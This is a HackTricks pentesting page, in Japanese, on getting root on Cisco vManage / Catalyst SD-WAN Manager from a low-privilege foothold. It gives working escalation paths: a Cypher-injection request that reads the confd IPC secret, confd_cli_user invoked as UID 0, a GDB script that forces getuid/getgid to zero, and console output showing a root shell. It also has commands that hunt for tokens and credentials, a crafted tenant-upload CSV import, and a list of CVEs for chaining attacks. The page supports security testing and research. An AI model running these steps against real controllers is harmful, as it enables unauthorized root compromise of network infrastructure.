# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* 上で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を取得した場合、最も注目すべきローカル privesc の攻撃対象は、通常 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs、そして root-owned の import/upload handlers です。

controller 上でまだ **initial foothold** が必要な場合は、まず専用の control-plane ページを確認してください。

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret` が foothold から読み取り可能であれば、Path 1 と Path 2 はすぐに実行可能になります。リモートの情報 leak や webshell 経由で侵入した場合は、`vmanage-admin` の SSH マテリアルや multitenancy の upload handler にすでにアクセスできるかどうかも確認してください。2026 年の research では、いずれも現実的な足掛かりになることが示されました。

## Path 1

（[https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) の例）<sup>[[5]](#references)</sup>

`confd` と各種バイナリに関する [documentation](http://66.218.245.39/doc/html/rn03re18.html)（Cisco の Web サイトのアカウントでアクセス可能）を少し調査したところ、IPC socket の認証には `/etc/confd/confd_ipc_secret` に保存された secret が使用されていることがわかりました：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j instance を覚えていますか？これは `vmanage` ユーザーの権限で実行されているため、以前の脆弱性を利用してファイルを取得できます。
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしておらず、引数付きで `/usr/bin/confd_cli_user` を呼び出します。そのため、`/usr/bin/confd_cli_user` を独自の引数セットで直接呼び出せます。ただし、現在の権限ではこのファイルを読み取れないため、rootfs から取得して scp でコピーし、ヘルプを読み、それを利用して shell を取得する必要があります。
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## パス 2

（例：[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)）<sup>[[6]](#references)</sup>

synacktiv team による blog<sup>[[5]](#references)</sup>では、root shell を取得する elegant な方法が説明されていますが、`/usr/bin/confd_cli_user` の copy を入手する必要があるという caveat があります。このファイルは root だけが read できます。私は、このような手間をかけずに root へ escalate する別の方法を見つけました。

`/usr/bin/confd_cli` binary を disassemble したところ、次の内容を確認しました。

<details>
<summary>UID/GID の収集を示す Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

「ps aux」を実行すると、以下の内容が表示されました（_注: -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
「confd_cli」プログラムは、ログインユーザーから取得したユーザーIDとグループIDを「cmdptywrapper」アプリケーションに渡していると仮説を立てました。

最初の試みとして、「cmdptywrapper」を直接実行し、`-g 0 -u 0` を指定しましたが、失敗しました。途中のどこかでファイルディスクリプタ（-i 1015）が作成されているようで、それを偽装することはできません。

synacktivのブログ（最後の例）で述べられているように、`confd_cli` プログラムはコマンドライン引数をサポートしていません。しかし、debuggerで動作に影響を与えることができ、幸いにもシステムにはGDBが含まれています。

API `getuid` と `getgid` が0を返すよう強制するGDB scriptを作成しました。deserialization RCEによってすでに「vmanage」privilegeを取得しているため、`/etc/confd/confd_ipc_secret` を直接読み取る権限があります。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、[CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) に関する独自の advisory で、より簡潔なローカル root path を文書化しました。**read-only privileges しか持たない認証済み attacker**でも、入力検証が不十分なため、manager CLI に細工した request を送信して root へ移行できました。<sup>[[7]](#references)</sup>

攻撃者の視点で重要な takeaway は次のとおりです。

1. ボックス上で *any* low-priv foothold を確保したら、より大掛かりな Path 1 / Path 2 workflow に進む前に、local CLI service をテストするべきです。
2. Path 2 の artifacts を再利用して trust boundary を特定します: `confd_cli` → `cmdptywrapper` → `vshell`。
3. CLI backend に転送されるすべての field を suspicious とみなします: UID/GID、username、terminal metadata、imported files、または後で root-owned helper によって消費される任意の value。
4. low-priv user が local CLI socket に到達し、これらの field に影響を与えられる場合、root 取得は細工した request 1 つで可能になるかもしれません。

appliance に侵入した後の実践的な workflow は次のとおりです：
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは、2025年のbugを類似バージョン向けの有効なhunting patternに変えるものです。つまり、**userlandでidentityを収集し、よりprivilegedなwrapperに転送する local CLI shims**を探します。

**CVE-2025-20122**と、その後の**CVE-2026-20122**を混同しないでください。2025年のissueは*local*なCLI-to-root bugであるのに対し、2026年のissueは*remote*なAPIによるarbitrary file overwriteであり、主にfootholdを設置した後、Path 1 / Path 2 / Path 4を再度調査するために役立ちます。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Ciscoの2026年2月のadvisoryでは、もう1つ有用なprivesc classとして[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)も紹介されました。このissueでは、REST APIのuser-authentication mechanismが不十分だったため、**authenticatedなlocal attacker with low privileges**がrootを取得できました。<sup>[[1]](#references)</sup>

これは、vManageのprivescがもはや`confd`/TTY abuseだけに限定されないことを意味します。low-priv shellを取得した後は、次の項目もhuntしてください。

- callerを過度に信頼するlocalhost-only API endpoints
- 現在のaccountから読み取り可能なtokens、cookies、またはservice credentials
- `dataservice`/REST handlersを通じて公開され、localからtrigger可能なroot-only actions

実際には、`vmanage`または別のservice userとしてshellを取得したら、local API abuseはinteractive CLI abuseよりも目立ちにくく、自動化も容易な場合が多くなります。
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションのコンテキストだけで privileged REST functionality にアクセスできる場合は、API path を優先します。replay、script 化、盗まれた web session や API token との chain が容易だからです。

## Path 5 (2026 年に root が処理する細工されたファイル - CVE-2026-20245)

もう 1 つの最近のパターンは [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) です。`netadmin` 権限を持つ local attacker が**細工されたファイル**を upload でき、CLI が後からそれを安全でない方法で処理することで、`root` として command injection につながる可能性がありました。<sup>[[2]](#references)</sup>

HackTricks の観点では、価値のある technique は特定の CVE よりも広範です。

1. ファイルを受け付けるすべての CLI または web workflow を列挙します。imports、diagnostic bundles、templates、validators、backups、tenant data などが対象です。
2. upload されたファイルが配置される場所と、それを消費する root-owned script または binary を追跡します。
3. filename、file content、または parsed metadata が、shell commands、wrapper scripts、あるいは `system()`-style helpers に渡されることがないかを確認します。
4. すでに `netadmin` に到達できる場合（有効な creds、盗まれた session、または auth-bypass chain）、file-processing bugs は root への最短経路になることがよくあります。

Google Cloud / Mandiant は後に、この bug class が multitenancy import path を通じて exploit された具体的な事例を示しました。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
観測された攻撃では、細工された CSV によって `/etc/passwd` と `/etc/shadow` が変更され、一時的な UID 0 アカウント（`troot`）が作成されました。<sup>[[4]](#references)</sup> そのため、`tenant-upload` / `tenant-list` 系の importer は特に興味深い対象です。これらは単なるデータ取り込み機能ではなく、root 所有の parser フロントエンドとなる可能性があります。

shell 側で手早く hunting するパターンは次のとおりです。
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
この bug class は、`root` ではなく `netadmin` を付与する remote foothold と特にうまく連鎖します。

## chain する価値がある、その他の最近の vManage/Catalyst SD-WAN Manager vulns

- **Unauthenticated info leak (CVE-2026-20133)** – 公開された research により、`confd_ipc_secret` または `vmanage-admin` の private key が漏洩する可能性が示されたため、特に価値が高いです。これにより、read bug を Path 1 または NETCONF pivot のいずれかに変えられます。<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 上記の 2025 CLI bug とは異なります。VulnCheck はこれを使って webshell を upload しており、その後はこのページの local privesc paths が直ちに重要になります。<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – web UI で admin session を盗み、API/CLI actions に pivot して最終的に `vshell` または上記の local privesc paths に到達します。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 2026 crafted-file privesc で必要となるレベルがまさに `netadmin` であるため、Path 5 の非常に強力な precursor です。<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – 後続の web UI upload path を通じて実行されるため、CVE-2026-20122 と同様の offensive value があります。root または management-plane web tier によって後から parse される場所へ write します。
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 年の intrusions では、攻撃者が古い vulnerable SD-WAN build に rollback し、旧 CLI root bug を悪用した後、元の version に restore できることが示されました。<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 専用の SD-WAN control-plane page で詳しく説明しています。`vmanage-admin` 用の SSH key を append できるため、このページを再訪するために必要な local foothold を取得できます。



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
